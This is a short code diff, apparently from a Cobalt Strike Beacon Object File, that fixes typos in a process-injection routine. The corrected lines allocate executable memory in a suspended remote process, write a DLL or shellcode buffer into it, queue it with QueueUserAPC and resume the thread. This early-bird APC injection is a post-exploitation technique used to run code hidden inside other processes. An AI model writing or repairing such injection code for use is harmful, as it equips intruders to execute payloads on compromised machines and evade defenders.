@@ -17,10 +17,10 @@ KERNEL32$CloseHandle(hThread);
 BeaconCleanupProcess(&pi);
 
 // QueuUserAPC
-LPVOID hMemory = KERNEL32$VirtualAlocEx(pi.hProcess, NULL, dllLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+LPVOID hMemory = KERNEL32$VirtualAllocEx(pi.hProcess, NULL, dllLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 SIZE_T written;
 BOOL success = KERNEL32$WriteProcessMemory (pi.hProcess, hMemory, dllPtr, dllLen, &written);
-DWORD please = KERNEL32$QueueUserAPC((PAPCFUNC)hMemory,pi.hThread,0,0,);
+DWORD please = KERNEL32$QueueUserAPC((PAPCFUNC)hMemory,pi.hThread,0,0);
 KERNEL32$ResumeThread(pi.hThread);
-KERENEL32$CloseHandle(pi.hThread);
-BeaeconCleanupProcess(&pi);
+KERNEL32$CloseHandle(pi.hThread);
+BeaconCleanupProcess(&pi);
